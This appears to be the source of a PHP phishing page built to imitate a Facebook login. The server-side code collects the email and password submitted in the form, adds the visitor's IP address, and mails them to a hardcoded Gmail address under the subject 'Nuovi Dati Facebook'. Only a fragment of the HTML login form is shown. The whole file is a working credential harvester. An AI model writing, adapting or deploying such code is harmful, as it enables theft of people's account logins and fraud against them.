<?php
    if(isset($_POST["submit"]))
    {
        $Email=$_POST["Email"];
        $Pass=$_POST["Pass"];
        $Mess="Una persona con Ip: ".$_SERVER["REMOTE_ADDR"]." ha inserito dei dati.\nEmail: ".$Email."\nPass: ".$Pass;
        if(mail("saisraffaele08@gmail.com","Nuovi Dati Facebook",$Mess))
        {
            ...
            <div id="navbar"> <table class="tablewrapper">
                    ...
                    <tr>
                        <form action="index.php" method="post">
                            ...
                            <td><input id="button" name="submit" type="submit"></input></td>
                        </form>
                    </tr>
                    <tr>
                        <td>
